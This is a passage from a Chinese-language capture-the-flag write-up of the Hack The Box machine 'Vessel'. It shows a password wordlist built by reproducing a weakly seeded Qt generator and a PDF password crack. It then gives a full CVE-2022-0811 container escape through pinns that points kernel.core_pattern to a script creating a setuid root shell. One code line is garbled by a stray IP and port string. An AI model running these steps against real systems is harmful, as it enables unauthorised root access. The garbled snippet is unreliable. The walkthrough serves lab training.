+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2026.png" alt="20230402" loading="lazy"></figure>
+<p>看到截图里有关键字Password Generator ，然后想到了刚刚file命令查看的那个文件（顺便也通过http服务器下载到本地了）</p>
+<h3 id="分析passwordgenerator">分析passwordGenerator</h3>
+<p>本地用strings提取字符串</p>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2027.png" alt="20230402" loading="lazy"></figure>
+<p>是pyinstaller exe的文件。使用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a></p>
+<pre><code class="language-php">python pyinstxtractor.py  /tmp/htb/passwordGenerator                                                                                                                                                                                 0 [15:01:23]
+[+] Processing /tmp/htb/passwordGenerator
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+</code></pre>
+<p>php下载  <code>uncomplye6</code>并用 uncomplye6 dump代码</p>
+<pre><code class="language-php">~ uncompyle6  passwordGenerator.pyc                                                                                                                                                                                                    (exploit) 0 [15:22:14]
+
+// 关键代码
+
+    def genPassword(self):
+        length = value  // 这里是32
+        char = index
+        if char == 0:
+            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+        else:
+            if char == 1:
+                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+            else:
+                if char == 2:
+                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+                else:
+                    try:
+                        qsrand(QTime.currentTime().msec())
+                        password = ''
+                        for i in range(length):
+                            idx = qrand() % len(charset)
+                            nchar = charset[idx]
+                            password += str(nchar)
+
+                    except:
+                        msg = QMessageBox()
+                        msg.setWindowTitle('Error')
+                        msg.setText('Error while generating password!, Send a message to the Author!')
+                        x = msg.exec_()
+
+                return password
+
+</code></pre>
+<h3 id="crack-password">Crack Password</h3>
+<p>刚刚图片的password length是32位，这里length为32，all characters意味着char==0</p>
+<p>结合已知py脚本，生成特定条件下的密码字典</p>
+<pre><code class="language-python">from PySide2.QtCore import *
+length = 32 
+charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+for i in range(0, 999):
+    qsrand(i)
+    password = ''
+    for i in range(length):
+        idx = qrand() % len(charset)
+        nchar = charset[idx]192.168.3.34：8000192192192
+        password += str(nchar)
+    print(password)
+</code></pre>
+<p>使用 <code>pdfcrack</code> 将上述输出作为wordlist破解对应pdf。这里有点坑的是，windows下生成的密码字典和linux下生成的会有差异。最后密码是</p>
+<pre><code class="language-python">YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2028.png" alt="20230402" loading="lazy"></figure>
+<h3 id="ethans-flag">ethan’s flag</h3>
+<p>用su切换到ethan或者ssh链接，密码是pdf里面的。成功拿下user flag</p>
+<pre><code class="language-python">b@mPRNSVTjjLKId1T
+</code></pre>
+<h2 id="root-flag">root flag</h2>
+<ol>
+<li>先用 <code>sudo -l</code> 查看ethan有什么权限，发现没有线索。</li>
+<li>用 <code>find</code> 命令查看用户/用户组所属的目录</li>
+</ol>
+<pre><code class="language-diff">find / -user ethan 2&gt;/dev/null | grep -Ev '^/(run|sys|proc|home)'
+find / -group ethan 2&gt;/dev/null | grep -Ev '^/(run|sys|proc|home)'
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2029.png" alt="20230402" loading="lazy"></figure>
+<h3 id="pinns">pinns</h3>
+<p><code>md5sum</code> 的结果去virustotal上查无果，用 <code>-h</code> 也无果。 用google dork的方法去搜索，语法：</p>
+<pre><code class="language-diff">&quot;/pinns&quot; namespaces  github
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2030.png" alt="20230402" loading="lazy"></figure>
+<p>但是输入相关得参数却不是</p>
+<figure data-type="image" tabindex="32"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2031.png" alt="20230402" loading="lazy"></figure>
+<p>带exploit关键词搜，会搜到这篇<a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">文章</a>，得知是CVE-2022-0811</p>
+<figure data-type="image" tabindex="33"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2032.png" alt="20230402" loading="lazy"></figure>
+<p>确认版本号：</p>
+<figure data-type="image" tabindex="34"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2033.png" alt="20230402" loading="lazy"></figure>
+<h3 id="cve-2022-0811">CVE-2022-0811</h3>
+<p>即使有大佬博客的学习，但持续性的啃hard的box，我差点啃不下去了……</p>
+<p>不过该看还是得看。</p>
+<blockquote>
+<p>0xdf：It is a vulnerability in the CRI-O container engine, an open source container engine which can replace Docker in Kubernetes implementation such as OpenShift.</p>
+</blockquote>
+<p>产生漏洞的原因是在 <code>version 1.19</code> 里盲目的添加了 sysctl的支持，而没有做内核参数绑定校验（如图，刚那篇文章里的）</p>
+<figure data-type="image" tabindex="35"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2034.png" alt="20230402" loading="lazy"></figure>
+<p>参考：<a href="https://docs.kernel.org/admin-guide/sysctl/">https://docs.kernel.org/admin-guide/sysctl/</a>  这里我们要想办法利用该漏洞滥用sysctl的特性拿到root access</p>
+<figure data-type="image" tabindex="36"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2035.png" alt="20230402" loading="lazy"></figure>
+<p>这里设置</p>
+<ul>
+<li><code>kernel.shm_rmid_forced=1</code></li>
+<li><code>kernel.core_pattern=|[script] #</code></li>
+</ul>
+<p>之所以是 <code>|</code> 开头看文档描述：</p>
+<pre><code class="language-diff">If the first character of the pattern is a ‘|’, the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file.
+</code></pre>
+<p>首先在exploit前先确认原始的参数值</p>
+<figure data-type="image" tabindex="37"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2036.png" alt="20230402" loading="lazy"></figure>
+<p>运行命令</p>
+<pre><code class="language-diff">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' -f filename -d /dev/shm -U
+</code></pre>
+<p>同样检查是否更改对应值。发现成功了</p>
+<pre><code class="language-diff">ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
+|/tmp/exp.sh #
+1
+</code></pre>
+<p>在 <code>exp.sh</code> 下写入如下内容，并用 <code>chmod</code> 赋予对应权限（ <code>+x</code> )</p>
+<pre><code class="language-diff">#!/bin/bash
+
+cp /bin/bash /tmp/htb
+chown root:root /tmp/htb
+chmod 4755 /tmp/htb
+</code></pre>
+<p>这个脚本是创建了一份bash得拷贝，并设置了对应的权限。同时我们的内核变量  `/proc/sys/kernel/core_pattern``  也已经指向到了该脚本</p>
+<p>然后</p>
+<pre><code class="language-diff">cp exp.sh .w  /dev/shm
+</code></pre>
+<p>执行</p>
+<pre><code class="language-diff">sleep 100&amp;
+killall -s SIGSEGV sleep
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2037.png" alt="20230402" loading="lazy"></figure>
+<p>拿到root的flag</p>
+<h2 id="结语">结语</h2>
+<p>虽然前面是express的mis-handle但是后续关于owa的历史版本1.7.3包含了大量的php代码审计部分，如果想训练代码审计结合实战是不错得选择。只是对我这种菜鸟代码量太多了，所以选择偷懒得方式直接看别人分析好的代码文章而不是clone历史漏洞版本。但，如果后续想要去尝试漏洞挖掘的时候回过头再过一遍这个分析的过程也是不错得选择。</p>
+<p>老实说那个passwordgenerator有点坑……hard的box确实很难（叹气） 继续练习，不要放弃。</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2023/03/25/htb-vessel.html">https://0xdf.gitlab.io/2023/03/25/htb-vessel.html</a></li>
+<li><a href="https://pentesterlab.com/">https://pentesterlab.com/</a></li>
+<li><a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a></li>
+<li><a href="https://docs.kernel.org/admin-guide/sysctl/">https://docs.kernel.org/admin-guide/sysctl/</a></li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/htbmentor/">
+              <h3 class="post-title">
+                下一篇：HTB:Mentor
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
